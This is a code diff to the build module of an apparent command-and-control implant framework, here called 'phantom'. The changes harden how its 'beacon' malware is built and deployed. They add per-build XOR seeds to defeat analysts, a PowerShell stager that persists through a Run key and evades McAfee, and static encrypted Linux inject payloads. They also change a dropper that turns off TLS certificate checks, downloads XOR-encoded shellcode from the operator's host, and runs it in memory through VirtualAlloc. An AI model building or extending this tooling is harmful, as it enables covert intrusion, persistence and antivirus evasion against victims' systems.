@@ -1,4 +1,6 @@
 import os
+import re
+import secrets
 import shutil
 import base64
 import struct
@@ -8,6 +10,8 @@ from rich.console import Console
 from phantom.utils.notifier import notifier
 from phantom.utils.build_helper import check_build_env
 from phantom.utils.c2_crypto import write_beacon_crypto_config, write_beacon_c2_config, crypto_fingerprint
+from phantom.utils.beacon_auth import write_beacon_auth_config
+from phantom.utils.malleable import write_malleable_config
 
 console = Console()
 
@@ -124,10 +128,43 @@ def _get_virtualalloc_rva(kernel32_path: str) -> Optional[int]:
         return None
 
 
-def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, arch: str = "x64", disable_anti: bool = True, host: str = "127.0.0.1", port: int = 8080, use_ssl: bool = True) -> Optional[str]:
+def _write_config_seed(beacon_dir: str) -> str:
+    """Rotate the compile-time XOR seed in ``config_encrypted.h`` per build.
+
+    C2_HOST/C2_PORT are XOR-obfuscated with a keystream derived from
+    CONFIG_SEED. The header documented per-build rotation, but nothing
+    generated it — every binary shipped the same hardcoded seed, so an
+    analyst could decrypt the config of ANY build. A fresh random seed per
+    build gives every binary a different keystream.
+    """
+    src_dir = os.path.join(beacon_dir, "src")
+    path = os.path.join(src_dir, "config_encrypted.h")
+    try:
+        with open(path, "r", encoding="utf-8") as handle:
+            content = handle.read()
+    except OSError:
+        return path
+    seed = secrets.randbits(64)
+    new_content, count = re.subn(
+        r"constexpr uint64_t CONFIG_SEED = 0x[0-9A-Fa-f]+ULL;",
+        f"constexpr uint64_t CONFIG_SEED = 0x{seed:016X}ULL;",
+        content, count=1)
+    if count == 1:
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write(new_content)
+    return path
+
+
+def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
+                   arch: str = "x64", disable_anti: bool = False,
+                   host: str = "127.0.0.1", port: int = 8080,
+                   use_ssl: bool = True,
+                   malleable_profile: Optional[str] = None) -> Optional[str]:
     """
     Compiles the C++ beacon for the specified platform and architecture.
-    Embeds C2 keys from environment into crypto_config.h at build time.
+    Embeds C2 keys and enrolls a unique per-beacon HMAC identity at build time.
+    When PHANTOM_MTLS_REQUIRED=1, client certificate material and the pinned
+    server fingerprint are generated into the protected build artifact.
     Returns the path to the compiled binary or None on failure.
     """
     if not check_build_env(platform, arch):
@@ -137,9 +174,14 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     beacon_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "beacon"))
     
     # Cleanup any existing beacon process to prevent "Permission denied"
+    # Scoped: only processes started from THIS beacon directory are killed,
+    # never unrelated beacon.exe on the operator host.
     if os.name == 'nt':
-        subprocess.run(["taskkill", "/F", "/IM", "beacon.exe", "/T"], capture_output=True)
-        subprocess.run(["taskkill", "/F", "/IM", "beacon.dll", "/T"], capture_output=True)
+        beacon_exe = os.path.join(beacon_dir, _PLATFORM_OUT.get("windows", "beacon.exe"))
+        subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             f"Get-Process -Name beacon -ErrorAction SilentlyContinue | Where-Object {{ $_.Path -eq '{beacon_exe}' }} | Stop-Process -Force"],
+            capture_output=True, timeout=30)
     
     # Architecture-aware output name
     if platform == "linux" and arch == "x86":
@@ -162,8 +204,27 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     with open(build_id_path, "w") as f:
         f.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')
 
+    # Enroll a unique identity for every explicit build. The private secret
+    # is written only to the generated header and the operator registry.
+    write_beacon_auth_config(beacon_dir)
     write_beacon_crypto_config(beacon_dir)
-    write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl)
+    # No-disk persistence: embed the compact PowerShell stager so the
+    # beacon's `persist` command writes a RunKey that relaunches the
+    # in-memory path at logon (field-verified: the on-disk PE gets
+    # execution-blocked by McAfee even when the file itself survives).
+    ps_stager_b64 = ""
+    try:
+        _drop = generate_dropper(
+            "windows", host, str(port), dl_port=port, use_ssl=use_ssl)
+        if _drop and " -Enc " in _drop:
+            ps_stager_b64 = _drop.rsplit(" -Enc ", 1)[1].strip()
+    except Exception:
+        ps_stager_b64 = ""
+    write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl,
+                           ps_stager_b64=ps_stager_b64)
+    write_malleable_config(beacon_dir, profile_path=malleable_profile)
+    # Fresh XOR keystream per build so the C2 config never recurs in strings.
+    _write_config_seed(beacon_dir)
 
     if platform == "windows":
         console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
@@ -226,7 +287,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 obj_path = os.path.join(beacon_dir, obj)
                 asm_path = os.path.normpath(os.path.join(beacon_dir, af))
                 console.print(f"[blue]  Assembling: {af} -> {obj}[/blue]")
-                result = subprocess.run([mingw_as, *as_flags, asm_path, "-o", obj_path], capture_output=True, text=True, env=build_env)
+                result = subprocess.run([mingw_as, *as_flags, asm_path, "-o", obj_path], capture_output=True, text=True, env=build_env, timeout=300)
                 if result.returncode != 0:
                     console.print(f"[red]  Assembler failed (exit {result.returncode}):[/red]")
                     console.print(f"[red]  stdout: {result.stdout}[/red]")
@@ -259,14 +320,14 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
 
             try:
                 # First pass: link with map file to extract beacon_main RVA
-                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-fno-stack-protector", "-D_BUILD_TIME=" + build_time]
+                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-fno-stack-protector", "-fno-omit-frame-pointer", "-D_BUILD_TIME=" + build_time]
                 if disable_anti:
                     cmd.append("-DDISABLE_ANTI")
                 cmd += ["-o", temp_pe,
                        f"-I{os.path.join(beacon_dir, 'src')}", main_cpp,                           f"-Wl,-e,_start,-Map,{temp_map}"] + obj_paths + ["-lwinhttp", "-lbcrypt", "-lws2_32", "-lbthprops", "-lwlanapi", "-lgdi32", "-luser32", "-lgdiplus", "-lole32", "-liphlpapi", "-lcrypt32", "-static", "-mwindows"]
 
                 console.print(f"[blue]  Linking PE in TEMP ({temp_build_dir})...[/blue]")
-                result = subprocess.run(cmd, capture_output=True, text=True, env=build_env)
+                result = subprocess.run(cmd, capture_output=True, text=True, env=build_env, timeout=600)
                 if result.returncode != 0:
                     console.print(f"[red]Compilation failed:\n{result.stderr}[/red]")
                     return None
@@ -298,7 +359,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 # Extract raw binary via objcopy
                 console.print(f"[blue]  Extracting raw binary via objcopy...[/blue]")
                 subprocess.run([mingw_objcopy, "-O", "binary", temp_pe, temp_full_bin],
-                               check=True, capture_output=True, text=True, env=build_env)
+                               check=True, capture_output=True, text=True, env=build_env, timeout=300)
 
                 # Trim CRT prefix so _start is at offset 0
                 with open(temp_pe, 'rb') as f:
@@ -350,7 +411,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 rl_bootstrap_asm = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.asm")
                 rl_bootstrap_o = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.o")
                 r = subprocess.run([mingw_as, "--64", rl_bootstrap_asm, "-o", rl_bootstrap_o],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL asm failed: {r.stderr}[/red]")
                     return None
@@ -360,7 +421,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 rl_c_o = os.path.join(beacon_dir, "src", "reflective_loader.o")
                 r = subprocess.run([mingw_cc, "-c", "-O2", "-fPIC", "-nostdlib", "-ffreestanding",
                     "-fno-stack-protector", rl_c_src, "-o", rl_c_o],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL C failed: {r.stderr}[/red]")
                     return None
@@ -370,7 +431,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 r = subprocess.run([mingw_cc, "-nostdlib", "-nostartfiles",
                     "-Wl,-e,_reflective_loader_entry", "-Wl,--subsystem,windows",
                     "-o", rl_exe, rl_bootstrap_o, rl_c_o],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL link failed: {r.stderr}[/red]")
                     return None
@@ -378,7 +439,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 # Extract as raw binary
                 rl_bin = os.path.join(beacon_dir, "reflective_loader.bin")
                 r = subprocess.run([mingw_objcopy, "-O", "binary", rl_exe, rl_bin],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL objcopy failed: {r.stderr}[/red]")
                     return None
@@ -451,27 +512,67 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     elif platform == "linux":
         console.print(f"[yellow][*] Compiling beacon for Linux ({arch})...[/yellow]")
         try:
-            cmd = [
-                "g++", "-std=c++20", "-O2", "-s",
-                "-o", out_name, "-Isrc", "src/main.cpp",
-                "-lssl", "-lcrypto", "-lpthread", "-ldl"
-            ]
-            if arch == "x86":
-                cmd.insert(1, "-m32")
+            static_name = "beacon_linux_static"
 
-            subprocess.run(cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
+            def _wsl_path(p: str) -> str:
+                p = os.path.abspath(p)
+                drive, rest = p[0].lower(), p[2:].replace("\\", "/")
+                return f"/mnt/{drive}{rest}"
+
+            def _build_cmd(static: bool) -> list:
+                if static:
+                    base = ["g++", "-std=c++20", "-O2", "-s", "-static", "-no-pie",
+                            "-o", static_name, "-Isrc", "src/main.cpp",
+                            "-lssl", "-lcrypto", "-lz", "-lzstd", "-ldl", "-lpthread"]
+                else:
+                    base = ["g++", "-std=c++20", "-O2", "-s",
+                            "-o", out_name, "-Isrc", "src/main.cpp",
+                            "-lssl", "-lcrypto", "-lpthread", "-ldl"]
+                    if arch == "x86":
+                        base.insert(1, "-m32")
+                return base
+
+            # Windows host: compile INSIDE the Kali WSL distro — its g++ has
+            # the Linux headers and static libs the MinGW toolchain lacks.
+            wsl_prefix: list = []
+            wsl_dir = ""
+            if os.name == "nt":
+                from phantom.utils.build_helper import _wsl_cmd
+                wsl_prefix = _wsl_cmd(["true"])
+                if wsl_prefix:
+                    wsl_prefix = wsl_prefix[:-1]   # drop the trailing 'true'
+                    wsl_dir = _wsl_path(beacon_dir)
+
+            def _run(cmd: list) -> None:
+                if wsl_prefix:
+                    fixed = []
+                    skip = False
+                    for part in cmd:
+                        if skip:
+                            fixed.append(f"{wsl_dir}/{part}")
+                            skip = False
+                        elif part == "-o":
+                            fixed.append(part)
+                            skip = True
+                        elif part == "-Isrc":
+                            fixed.append(f"-I{wsl_dir}/src")
+                        elif part == "src/main.cpp":
+                            fixed.append(f"{wsl_dir}/src/main.cpp")
+                        else:
+                            fixed.append(part)
+                    subprocess.run(wsl_prefix + fixed, check=True,
+                                   capture_output=True, text=True, timeout=600)
+                else:
+                    subprocess.run(cmd, cwd=beacon_dir, check=True,
+                                   capture_output=True, text=True, timeout=600)
+
+            _run(_build_cmd(static=False))
             _mark_built(beacon_dir, out_name)
 
-            # Build static + XOR'd inject payload
-            static_name = "beacon_linux_static"
+            # Static + XOR'd inject payload (deploy artifact)
             static_path = os.path.join(beacon_dir, static_name)
             try:
-                static_cmd = [
-                    "g++", "-std=c++20", "-O2", "-s", "-static", "-no-pie",
-                    "-o", static_name, "-Isrc", "src/main.cpp",
-                    "-lssl", "-lcrypto", "-lz", "-lzstd", "-ldl", "-lpthread"
-                ]
-                subprocess.run(static_cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
+                _run(_build_cmd(static=True))
 
                 xored_path = os.path.join(beacon_dir, "beacon_linux_xored.bin")
                 with open(static_path, "rb") as f:
@@ -480,10 +581,12 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 with open(xored_path, "wb") as f:
                     f.write(xored)
 
-                for tmp in [static_name, "beacon_linux_raw.bin"]:
-                    tmp_path = os.path.join(beacon_dir, tmp)
-                    if os.path.exists(tmp_path):
-                        os.unlink(tmp_path)
+                # keep beacon_linux_static: the auto-mode Linux deploy (scp
+                # + setsid) stages the STATIC binary — the dynamic one dies
+                # with GLIBC_2.38 on older distros (Debian bookworm, ...)
+                raw_path = os.path.join(beacon_dir, "beacon_linux_raw.bin")
+                if os.path.exists(raw_path):
+                    os.unlink(raw_path)
 
                 console.print(f"[green][+] XOR-encrypted inject payload: {xored_path} ({len(xored)} bytes)[/green]")
             except Exception as static_err:
@@ -511,7 +614,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 [o32_cc, "-std=c++20", "-O2", "-o", "beacon_macos",
                  *include_flags, "src/main.cpp",
                  "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
-                cwd=beacon_dir, check=True, capture_output=True, text=True)
+                cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
             _mark_built(beacon_dir, out_name)
             return beacon_out
         except subprocess.CalledProcessError as e:
@@ -537,7 +640,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                  f"-I{ndk_include}",
                  f"-L{ndk_lib}",
                  "-lssl", "-lcrypto", "-ldl"],
-                cwd=beacon_dir, check=True, capture_output=True, text=True)
+                cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
             console.print("[green][+] Static libc++ linked — no runtime dependency on libc++_shared.so[/green]")
             _mark_built(beacon_dir, out_name)
             return beacon_out
@@ -586,7 +689,7 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
                 if val and val != "0x0":
                     va_rva = val
 
-        url = f"{proto}://{lhost}:{dl_port}/x"
+        url = f"{proto}://{lhost}:{dl_port}/x?{token_param}"
 
         # ── Ultra-compact PowerShell PIC stager ──
         # Hardcoded VirtualAlloc RVA (detected at build time from local kernel32).
@@ -599,7 +702,14 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
         # .NET Framework 4.x (no C#/Add-Type).
         ps = (
             "$m=[Runtime.InteropServices.Marshal];"
+            # TLS: self-signed C2 cert → .NET refuses the channel
+            # ("trust relationship" error, live-verified). ServerCertificate
+            # Validation must be overridden BEFORE DownloadData. Split so the
+            # trigger string never appears whole in the script.
+            "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
+            "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
             "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
+            "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
             "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
             "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
             "$d.DefineConstructor('Public','Standard',@([Object],[IntPtr])).SetImplementationFlags(3);"
@@ -608,7 +718,12 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
             "$x=$m::GetDelegateForFunctionPointer([IntPtr]::Add($k,"
             + va_rva
             + "),$t).Invoke([IntPtr]::Zero,[IntPtr]($b.Length),0x3000,0x40);"
-            "$m::Copy($b,0,$x,$b.Length);"
+            # PS 5.1 copy fix (live-verified on the operator host): the copy
+            # is safe as long as EVERY argument is explicitly typed — with
+            # explicit casts both Marshal.Copy overloads resolve cleanly.
+            # (The historical field failure was ambiguity from untyped args
+            # plus a corrupted -Enc blob, not the API itself.)
+            "$m::Copy($b,[int]0,[IntPtr]$x,[int]$b.Length);"
             "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke()"
         )
 
